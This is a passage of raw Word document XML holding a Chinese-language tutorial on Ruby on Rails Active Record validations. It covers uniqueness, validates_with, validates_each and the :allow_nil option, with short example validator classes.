          <w:p w14:paraId="19BF938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658A97A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:name, :uniqueness</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :case_sensitive</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</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10E8A8B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3FF2ED6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需要注意的是某些数据库在执行查询时总是大小写敏感的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6589D23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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>has already been taken</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73538836" w14:textId="5F925648"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3.11 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_with</w:t>
      </w:r>
      <w:r w:rsidR="00703850">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 自定义校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669D6AD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该校验helper会</w:t>
      </w:r>
      <w:r w:rsidRPr="00703850">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>将AR对象传递到单独的类中校验</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="47DF9BE8" w14:textId="77777777" w:rsidTr="00497FD7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4018913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0989013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validates_with GoodnessValidator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68017BD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1BF7E80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108D2BF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GoodnessValidator &lt; ActiveModel::Validator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12DD3B6A" w14:textId="65383370" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00497FD7">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validate(</w:t>
            </w:r>
            <w:r w:rsidRPr="00497FD7">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>record</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidR="00497FD7">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  #</w:t>
            </w:r>
            <w:r w:rsidR="00497FD7" w:rsidRPr="00497FD7">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve">声明校验方法时，参数列表中必须有 </w:t>
            </w:r>
            <w:r w:rsidR="00497FD7" w:rsidRPr="00497FD7">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>record</w:t>
            </w:r>
            <w:r w:rsidR="00497FD7" w:rsidRPr="00497FD7">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> 参数，代表被校验的 AR 对象。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C3D155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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>record.first_name == "Evil"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E67AD0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record.errors[:base] &lt;&lt; "This person is evil"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A65AEE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39F380B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4D9E2AD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86CE68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02533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>错误信息是被添加到</w:t>
      </w:r>
      <w:r w:rsidRPr="0002533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>record.errors[:base]</w:t>
      </w:r>
      <w:r w:rsidRPr="0002533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>中，而不是某一特定的属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D49B5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02533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validates_with</w:t>
      </w:r>
      <w:r w:rsidRPr="0002533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以接受一个类或者一个类的数组用来校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="0002533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validates_with</w:t>
      </w:r>
      <w:r w:rsidRPr="0002533C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 没有默认的错误信息</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，你必须自己在校验中添加适当的错误信息到 Active Record 对象的错误集合中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDF835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何其它的校验一样，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_with</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项。如果你传入除此之外的选项，那么这些选项将作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数的一部分传递给校验器:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="470E7EE4" w14:textId="77777777" w:rsidTr="007E097E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08BF558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2F413EF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validates_with GoodnessValidator, :</w:t>
            </w:r>
            <w:r w:rsidRPr="007E097E">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>fields</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [:first_name, :last_name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="751852A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4128C0B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53760EB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GoodnessValidator &lt; ActiveModel::Validator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="731F3AF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validate(record)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1026610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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>options[:</w:t>
            </w:r>
            <w:r w:rsidRPr="007E097E">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>fields</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>].any?{|field| record.send(field) == "Evil"</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2B6481F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record.errors[:base] &lt;&lt; "This person is evil"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49DB8ED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0703B65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3476A7C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1226BA43" w14:textId="79635183"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3.12 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_each</w:t>
      </w:r>
      <w:r w:rsidR="00313C42">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 块校验、批量校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C4501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该 helper </w:t>
      </w:r>
      <w:r w:rsidRPr="00313C42">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>通过 block 来校验指定的属性</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。它没有预定义好的校验方法。你必须通过 block 来自己创建相应的校验逻辑，每个被传递给 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_each</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的属性都将被依次校验。如下例中，我们需要确保 name 和 surname 不是以小写字母开头的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="624EA336" w14:textId="77777777" w:rsidTr="007E097E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7042561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3BED2CA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313C42">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validates_each</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :name, :surname</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|record, attr, value|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14D8135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record.errors.add(attr, 'must start with upper case') if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value =~ /\A[a-z]/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4069A07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2F3D6B6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DD8496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该 block 接受 record 对象，属性名称和属性值三个参数。</w:t>
      </w:r>
      <w:r w:rsidRPr="00B6649D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>你可以在 block 中实现任何的校验逻辑</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>如果校验失败，你需要添加错误信息到 Active Record 对象中，将该对象标记为无效的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D85A945"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4 常用校验选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBBB1C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下面列出了一些常用的校验选项：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA006EC" w14:textId="17A37C8B"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4.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:allow_nil</w:t>
      </w:r>
      <w:r w:rsidR="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 允许为空</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5836473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:allow_nil</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">在被校验属性值为 </w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="0002548C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候跳过校验</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4D74F8EE" w14:textId="77777777" w:rsidTr="0002548C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35575E7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Coffee &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73CF4E9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:size, :inclusion</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :in</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; %w(small medium large),</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73062D5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:message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "%{value} is not a valid size"</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">}, </w:t>
            </w:r>
            <w:r w:rsidRPr="0002548C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:allow_nil</w:t>
            </w:r>
            <w:r w:rsidRPr="0002548C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
